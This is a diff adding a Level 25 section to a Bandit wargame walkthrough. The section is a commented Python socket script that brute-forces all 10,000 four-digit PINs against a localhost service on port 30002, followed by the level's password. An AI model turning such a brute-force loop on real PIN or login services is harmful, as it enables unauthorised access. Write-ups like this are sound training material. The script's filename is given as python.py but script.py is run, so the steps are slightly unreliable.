@@ -523,3 +523,63 @@ $ cat password24
 ![alt text](BanditScreenshots/24.5.png)
 
 The password is **gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8**
+
+# Level 25
+
+Here, we will write a python script with **nano** command into a file named **python.py** to brute force every pincode from 0000 to 9999.
+
+```python
+#!/usr/bin/env python3
+# Specify the Python interpreter to use (Python 3)
+import socket
+# Import the socket library for network communication
+
+HOST = "127.0.0.1"
+# Define the target host as localhost (IP address 127.0.0.1)
+PORT = 30002
+# Define the target port number where the server is listening
+PREFIX = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+# Define the fixed prefix for the message which is the current level
+
+# Connect to server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Create a new TCP socket object for IPv4 communication
+s.connect((HOST, PORT))
+# Establish a connection to the server at the specified host and port
+
+# Print welcome message (if any)
+print(s.recv(2048).decode())
+# Receive up to 2048 bytes from the server, decode to string, and print the welcome message
+
+# Brute-force pincode
+for pin in range(10000):
+# Loop through numbers 0 to 9999 to generate all possible four-digit pincodes
+    pincode = f"{pin:04d}"
+    # Format the current number as a four-digit string (e.g., 0000, 0001, ..., 9999)
+    message = f"{PREFIX} {pincode}\n"
+    # Construct the message by combining the prefix, a space, the pincode, and a newline
+    s.sendall(message.encode())
+    # Encode the message to bytes and send it to the server
+    response = s.recv(1024).decode().strip()
+    # Receive up to 1024 bytes from the server, decode to string, and remove trailing whitespace
+    if "Wrong" not in response:
+    # Check if the response does not contain "Wrong" to indicate a successful attempt
+        print(f"Success! PIN: {pincode}, Response: {response}")
+        # Print the successful pincode and server response
+        break
+        # Exit the loop upon finding the correct pincode
+    print(f"Wrong PIN: {pincode}")
+    # Print the pincode that resulted in a "Wrong" response
+s.close()
+# Close the socket connection to the server
+```
+
+Now let's execute it and wait for the success message.
+
+```console
+$ python3 ./script.py
+```
+
+![alt text](BanditScreenshots/25.png)
+
+The password is **iCi86ttT4KSNe1armKiwbQNmB3YJP3q4**
